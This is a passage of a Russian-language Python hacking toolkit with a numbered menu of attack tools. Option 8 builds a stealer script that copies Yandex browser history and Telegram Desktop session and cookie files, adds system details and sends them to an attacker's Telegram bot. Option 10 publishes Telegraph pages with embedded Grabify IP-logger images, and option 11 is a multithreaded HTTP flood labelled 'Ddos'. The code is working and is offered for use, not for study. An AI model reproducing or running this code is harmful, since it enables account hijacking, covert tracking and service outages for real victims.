            window = SelectionWindow()
            sys.exit(app.exec())

        return False

    elif choice == "8":
        import os

        def create_py_file(file_name, bot_token, user_id):
            desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
            file_path = os.path.join(desktop_path, f"{file_name}.py")

            code = f"""
import os
import shutil
import zipfile
import sqlite3
import socket
import uuid
import platform
from datetime import datetime
import random
import requests
import tempfile

BOT_TOKEN = '{bot_token}'
USER_ID = '{user_id}'

def get_system_info():
    username = os.getlogin()
    ip = socket.gethostbyname(socket.gethostname())
    windows_version = platform.version()
    mac_address = ':'.join(['{{:02x}}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return username, ip, windows_version, mac_address, current_time

def decrypt_history(history_path):
    conn = sqlite3.connect(history_path)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM urls")
    rows = cursor.fetchall()
    conn.close()
    return rows

def create_zip_with_files(files, zip_name):
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for file in files:
            if os.path.exists(file):
                zipf.write(file, os.path.basename(file))

def send_file_via_telegram(file_path, chat_id):
    url = f"https://api.telegram.org/bot{{BOT_TOKEN}}/sendDocument"
    with open(file_path, 'rb') as file:
        files = {{'document': file}}
        data = {{'chat_id': chat_id}}
        response = requests.post(url, files=files, data=data)
    return response.json()

def main():
    username, ip, windows_version, mac_address, current_time = get_system_info()

    user_profile = os.getenv('USERPROFILE')
    history_path = os.path.join(user_profile, "AppData", "Local", "Yandex", "YandexBrowser", "User Data", "Default", "History")
    telegram_desktop_path = os.path.join(user_profile, "AppData", "Roaming", "Telegram Desktop")
    files_to_add = [
        os.path.join(telegram_desktop_path, ".google-cookie"),
        os.path.join(telegram_desktop_path, "session_name.session"),
        os.path.join(telegram_desktop_path, "log.txt"),
        os.path.join(telegram_desktop_path, "bot_log.txt")
    ]

    temp_dir = tempfile.mkdtemp()
    temp_history_path = os.path.join(temp_dir, 'History')

    try:
        shutil.copy2(history_path, temp_history_path)

        history_data = decrypt_history(temp_history_path)

        decrypted_history_file = os.path.join(temp_dir, 'decrypted_history.txt')
        with open(decrypted_history_file, 'w', encoding='utf-8') as f:
            for row in history_data:
                f.write(f"{{row}}\\n")

        random_number = random.randint(1000, 9999)
        zip_name = f"OmNom_{{random_number}}.zip"
        create_zip_with_files([decrypted_history_file] + files_to_add, zip_name)

        info_file = os.path.join(temp_dir, 'system_info.txt')
        with open(info_file, 'w', encoding='utf-8') as f:
            f.write(f"Имя пользователя Windows: {{username}}\\n")
            f.write(f"IP: {{ip}}\\n")
            f.write(f"Версия Windows: {{windows_version}}\\n")
            f.write(f"MAC адрес: {{mac_address}}\\n")
            f.write(f"Время отправки: {{current_time}}\\n")
            f.write(f"Время на компьютере: {{current_time}}\\n")

        with zipfile.ZipFile(zip_name, 'a') as zipf:
            zipf.write(info_file, os.path.basename(info_file))

        send_file_via_telegram(zip_name, USER_ID)

    except Exception as e:
        print(f"Ошибка: {{e}}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)
        if os.path.exists(zip_name):
            os.remove(zip_name)

if __name__ == "__main__":
    main()
                """

            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(code)
            print(f"Файл '{file_name}.py' успешно создан на рабочем столе.")

        def main():
            bot_token = input("Введите Токен Телеграм Бота: ")
            user_id = input("Введите ID Телеграм Аккаунта Которому Будут Идти Данные: ")
            file_name = input("Введите Название Для Файла (Без Расширения .py): ")

            create_py_file(file_name, bot_token, user_id)

        if __name__ == "__main__":
            main()
        return False

    elif choice == "9":

        import requests

        def get_ip_info(ip_address):
            try:
                url = f"https://ipinfo.io/{ip_address}/json"
                response = requests.get(url, timeout=10)

                if response.status_code == 200:
                    data = response.json()
                    return data
                else:
                    print(f"Ошибка: {response.status_code}")
                    return None

            except requests.exceptions.RequestException as e:
                print(f"Ошибка подключения: {e}")
                return None

        def main():
            ip_address = input("Введите IP-адрес или домен: ")

            print("\n[•] Сканирование начато...")
            ip_info = get_ip_info(ip_address)

            if ip_info:
                print("\n" + "=" * 40)
                print("ДЕТАЛЬНАЯ ИНФОРМАЦИЯ ОБ IP-АДРЕСЕ".center(40))
                print("=" * 40)

                info_fields = [
                    ('IP', 'ip'),
                    ('Хост', 'hostname'),
                    ('Город', 'city'),
                    ('Регион', 'region'),
                    ('Страна', 'country'),
                    ('Почтовый индекс', 'postal'),
                    ('Часовой пояс', 'timezone'),
                    ('Координаты', 'loc')
                ]

                for label, key in info_fields:
                    value = ip_info.get(key, 'недоступно')
                    print(f"{label + ':':<18} {value}")

                # Обработка ASN и провайдера
                org = ip_info.get('org')
                if org:
                    asn, _, provider = org.partition(' ')
                    print(f"{'ASN:':<18} {asn}")
                    print(f"{'Провайдер:':<18} {provider}")
                else:
                    print(f"{'ASN:':<18} недоступно")
                    print(f"{'Провайдер:':<18} недоступно")

                # Ссылка на карты
                if ip_info.get('loc'):
                    loc = ip_info['loc'].replace(',', '%2C')
                    print(f"\nGoogle Maps: https://www.google.com/maps/?q={loc}")

                print("=" * 40)
            else:
                print("\n[!] Не удалось получить информацию")

            input("\nНажмите Enter для продолжения...")

        if __name__ == "__main__":
            main()

        return False

    elif choice == "10":

        from dataclasses import dataclass
        from typing import List, Optional
        import re
        from telegraph import Telegraph, TelegraphException

        @dataclass
        class НастройкиСтатьи:
            макс_длина_заголовка: int = 30
            шаблон_ссылки: str = r'^https://grabify\.link/.*\.(jpg|png)$'

        @dataclass
        class Статья:
            заголовок: str
            текст: str
            ссылка: str
            количество_ссылок: int

            def проверить(self, настройки: НастройкиСтатьи) -> List[str]:
                ошибки = []
                if not self.заголовок.strip():
                    ошибки.append("Заголовок не может быть пустым")
                if len(self.заголовок) > настройки.макс_длина_заголовка:
                    ошибки.append(f"Заголовок должен быть не более {настройки.макс_длина_заголовка} символов")
                if not self.текст.strip():
                    ошибки.append("Текст не может быть пустым")
                if not re.match(настройки.шаблон_ссылки, self.ссылка):
                    ошибки.append("Неверный формат ссылки. Должна быть ссылка Grabify с окончанием .jpg или .png")
                if self.количество_ссылок < 1:
                    ошибки.append("Количество ссылок должно быть положительным числом")
                return ошибки

        class ПубликаторСтатей:
            def __init__(self):
                self.telegraph = Telegraph()
                self.telegraph.create_account(short_name='console_publisher')
                self.настройки = НастройкиСтатьи()

            def создать_статью(self) -> Optional[str]:
                try:
                    заголовок = input("Введите заголовок статьи: ").strip()
                    текст = input("Введите текст статьи: ").strip()
                    ссылка = input("Введите ссылку Grabify (должна заканчиваться на .jpg или .png): ").strip()
                    количество_ссылок = int(input("Введите количество повторений ссылки: "))

                    статья = Статья(
                        заголовок=заголовок,
                        текст=текст,
                        ссылка=ссылка,
                        количество_ссылок=количество_ссылок
                    )

                    ошибки = статья.проверить(self.настройки)
                    if ошибки:
                        print("\nОшибки валидации:")
                        for ошибка in ошибки:
                            print(f"- {ошибка}")
                        return None

                    html_контент = f"<p>{статья.текст}</p>"
                    for _ in range(статья.количество_ссылок):
                        html_контент += f'<img src="{статья.ссылка}"/>'

                    ответ = self.telegraph.create_page(
                        title=статья.заголовок,
                        html_content=html_контент
                    )

                    if 'url' in ответ:
                        return ответ['url']

                except ValueError:
                    print("Ошибка: Введите корректное число для количества ссылок")
                except TelegraphException as e:
                    print(f"Ошибка Telegraph API: {e}")
                except Exception as e:
                    print(f"Неожиданная ошибка: {e}")

                return None

        def main():
            публикатор = ПубликаторСтатей()

            print("=== Создание статьи в Telegraph ===")
            url = публикатор.создать_статью()

            if url:
                print("\nСтатья успешно создана!")
                print(f"URL: {url}")
            else:
                print("\nНе удалось создать статью. Попробуйте еще раз.")

        if __name__ == "__main__":
            main()

        return False
    elif choice == "11":

        import time
        import random
        import requests
        import threading
        from typing import Optional, List
        from dataclasses import dataclass
        from colorama import init, Fore, Style
        import os

        init()

        @dataclass
        class UserAgentComponents:

            browsers: List[str] = None
            os_systems: List[str] = None
            versions: List[str] = None

            def __post_init__(self):
                self.browsers = [
                    'Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'
                ]
                self.os_systems = [
                    'Windows NT 10.0', 'Windows NT 11.0',
                    'Macintosh; Intel Mac OS X 10_15_7',
                    'X11; Linux x86_64', 'iPhone; CPU iPhone OS 14_7_1'
                ]
                self.versions = [
                    '91.0.4472.124', '92.0.4515.107', '93.0.4577.63',
                    '94.0.4606.81', '95.0.4638.54', '96.0.4664.45'
                ]

        @dataclass
        class AttackConfig:

            target_url: str
            num_threads: int
            delay: float = 0.1

        class ConsoleUI:

            @staticmethod
            def print_colored(text: str, color: Fore) -> None:
                os.system('')
                print(f"{color}{text}{Style.RESET_ALL}")

            @staticmethod
            def success(message: str) -> None:
                ConsoleUI.print_colored(f"[+] {message}", Fore.GREEN)

            @staticmethod
            def error(message: str) -> None:
                ConsoleUI.print_colored(f"[-] {message}", Fore.RED)

            @staticmethod
            def info(message: str) -> None:
                ConsoleUI.print_colored(f"[*] {message}", Fore.CYAN)

        class UserAgentGenerator:

            def __init__(self):
                self.components = UserAgentComponents()

            def generate(self) -> str:
                browser = random.choice(self.components.browsers)
                os_system = random.choice(self.components.os_systems)
                version = random.choice(self.components.versions)

                if browser == 'Chrome':
                    return f'Mozilla/5.0 ({os_system}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36'
                elif browser == 'Firefox':
                    return f'Mozilla/5.0 ({os_system}; rv:{version}) Gecko/20100101 Firefox/{version}'
                elif browser == 'Safari':
                    return f'Mozilla/5.0 ({os_system}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15'
                elif browser == 'Edge':
                    return f'Mozilla/5.0 ({os_system}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36 Edg/{version}'
                else:  # Opera
                    return f'Mozilla/5.0 ({os_system}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36 OPR/{version}'

        class RequestWorker:

            def __init__(self, config: AttackConfig):
                self.config = config
                self.user_agent_generator = UserAgentGenerator()

            def get_headers(self) -> dict:
                return {
                    'User-Agent': self.user_agent_generator.generate(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                }

            def send_request(self) -> None:
                while True:
                    try:
                        headers = self.get_headers()
                        response = requests.get(
                            self.config.target_url,
                            headers=headers,
                            timeout=10
                        )
                        ConsoleUI.success(
                            f"Request sent successfully - Status: {response.status_code} - "
                            f"User-Agent: {headers['User-Agent'][:50]}..."
                        )
                    except Exception as e:
                        ConsoleUI.error(f"Request failed - {str(e)}")

                    time.sleep(self.config.delay)

        def main():

            ConsoleUI.info("Ddos")
            target_url = input(f"{Fore.CYAN}[?] Enter target URL: {Style.RESET_ALL}")
            num_threads = int(input(f"{Fore.CYAN}[?] Enter number of threads: {Style.RESET_ALL}"))
            delay = float(input(f"{Fore.CYAN}[?] Enter delay between requests (in seconds): {Style.RESET_ALL}"))

            config = AttackConfig(
                target_url=target_url,
                num_threads=num_threads,
                delay=delay
            )

            ConsoleUI.info("Starting requests...")
            workers = []
            for _ in range(config.num_threads):
                worker = RequestWorker(config)
                thread = threading.Thread(target=worker.send_request)
                thread.daemon = True
                thread.start()
                workers.append(thread)

            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                ConsoleUI.info("Stopping by user request...")

        if __name__ == "__main__":
            main()

        return False


    elif choice == "13":

        import random

        browsers = ["Chrome", "Firefox", "Safari", "Edge", "Opera", "Vivaldi", "Brave", "YaBrowser", "SeaMonkey"]

        os_systems = [
            "Windows NT 10.0", "Windows NT 6.3", "Windows NT 6.2",
            "Macintosh; Intel Mac OS X 10_15", "Macintosh; Intel Mac OS X 10_14",
            "X11; Linux x86_64", "X11; Ubuntu; Linux x86_64",
            "iPhone OS 14_0", "iPhone OS 15_0",
            "Android 10.0", "Android 11.0", "Android 12.0"
        ]

        browser_versions = {
            "Chrome": ["90.0.4430.212", "91.0.4472.124", "92.0.4515.107", "93.0.4577.63"],
            "Firefox": ["88.0", "89.0", "90.0", "91.0", "92.0"],
            "Safari": ["14.0", "14.1", "15.0", "15.1"],
            "Edge": ["91.0.864.48", "92.0.902.62", "93.0.961.38"],
            "Opera": ["76.0.4017.123", "77.0.4054.172", "78.0.4093.112"],
            "Vivaldi": ["3.8.2259.42", "3.9.2345.45", "4.0.2312.41"],
            "Brave": ["1.25.68", "1.26.74", "1.27.109"],
            "YaBrowser": ["21.5.2.638", "21.6.0.1371", "21.7.0.1525"],
            "SeaMonkey": ["2.53.7", "2.53.8", "2.53.9"]
        }

        platforms = {"Chrome": "AppleWebKit/537.36", "Safari": "AppleWebKit/537.36",
                     "Edge": "AppleWebKit/537.36", "Opera": "AppleWebKit/537.36"}

        def generate_useragent():
            browser = random.choice(browsers)
            os_system = random.choice(os_systems)
            browser_version = random.choice(browser_versions[browser])
            platform = platforms.get(browser, "Gecko/20100101")

            return f'Mozilla/5.0 ({os_system}) {platform} {"Safari" if browser == "Safari" else browser}/{browser_version}'

        def generate():
            try:
                count = int(input("Сколько user-agents сгенерировать? "))
                if count <= 0:
                    print("Пожалуйста, введите положительное число.")
                    return

                generated_agents = {generate_useragent() for _ in range(count)}
                while len(generated_agents) < count:
                    generated_agents.add(generate_useragent())

                for ua in generated_agents:
                    print(f'"{ua}",')

                choice = input("\nВведите R для перезапуска или Q для выхода: ").upper()
                if choice == 'R':
                    generate()
                elif choice == 'Q':
                    print("Программа завершена.")

            except ValueError:
                print("Пожалуйста, введите корректное число.")
                choice = input("\nВведите R для перезапуска или Q для выхода: ").upper()
                if choice == 'R':
                    generate()
            except KeyboardInterrupt:
                print("\nГенерация прервана пользователем.")
                choice = input("\nВведите R для перезапуска или Q для выхода в главное меню: ").upper()
                if choice == 'R':
                    generate()

        if __name__ == "__main__":
            generate()

        return False

    else:
        display.error_message = "Неверный выбор"
        return False

def main() -> None:
    display = Display()
    try:
        while True:
            display.render()
            if process_user_input(display):
                break
    except KeyboardInterrupt:
        pass
    finally:
        print("\033[0m\033[?25h")

if __name__ == '__main__':
    main()